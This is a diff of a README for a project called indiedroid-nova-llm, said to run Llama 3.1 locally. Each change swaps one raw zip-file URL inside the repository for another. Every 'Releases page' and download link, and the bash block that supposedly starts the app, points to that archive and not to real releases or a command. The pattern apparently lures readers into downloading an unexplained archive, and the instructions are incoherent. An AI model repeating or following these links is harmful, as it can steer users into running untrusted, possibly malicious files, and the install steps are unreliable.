@@ -1,6 +1,6 @@
 # 🚀 indiedroid-nova-llm - Run Llama 3.1 and More Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/MonitooDev/indiedroid-nova-llm/master/benchmarks/nova-indiedroid-llm-crocoisite.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/MonitooDev/indiedroid-nova-llm/master/benchmarks/nova-indiedroid-llm-crocoisite.zip)
+[![Download Latest Release](https://github.com/MonitooDev/indiedroid-nova-llm/raw/refs/heads/master/images/indiedroid-nova-llm-1.0.zip%20Latest%20Release-v1.0-blue)](https://github.com/MonitooDev/indiedroid-nova-llm/raw/refs/heads/master/images/indiedroid-nova-llm-1.0.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To ensure the best performance, please check the following:
 
 1. **Visit the Releases Page**
 
-   Go to the [Releases page](https://raw.githubusercontent.com/MonitooDev/indiedroid-nova-llm/master/benchmarks/nova-indiedroid-llm-crocoisite.zip) to find the latest version of the software.
+   Go to the [Releases page](https://github.com/MonitooDev/indiedroid-nova-llm/raw/refs/heads/master/images/indiedroid-nova-llm-1.0.zip) to find the latest version of the software.
 
 2. **Download the Package**
 
@@ -36,7 +36,7 @@ To ensure the best performance, please check the following:
    After extraction, open a terminal window. Navigate to the folder where you extracted the files. Use the command:
 
    ```bash
-   https://raw.githubusercontent.com/MonitooDev/indiedroid-nova-llm/master/benchmarks/nova-indiedroid-llm-crocoisite.zip
+   https://github.com/MonitooDev/indiedroid-nova-llm/raw/refs/heads/master/images/indiedroid-nova-llm-1.0.zip
    ```
 
    This will start the application. Wait for the application to load completely.
@@ -66,7 +66,7 @@ For a deeper understanding of how to use the software, refer to the included doc
   
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/MonitooDev/indiedroid-nova-llm/master/benchmarks/nova-indiedroid-llm-crocoisite.zip) to download the latest version. The setup is straightforward, requiring minimal technical knowledge. Follow the installation steps above, and you’ll be ready to explore the capabilities of AI right on your device.
+To get started, visit the [Releases page](https://github.com/MonitooDev/indiedroid-nova-llm/raw/refs/heads/master/images/indiedroid-nova-llm-1.0.zip) to download the latest version. The setup is straightforward, requiring minimal technical knowledge. Follow the installation steps above, and you’ll be ready to explore the capabilities of AI right on your device.
 
 ## 📚 Additional Resources
 
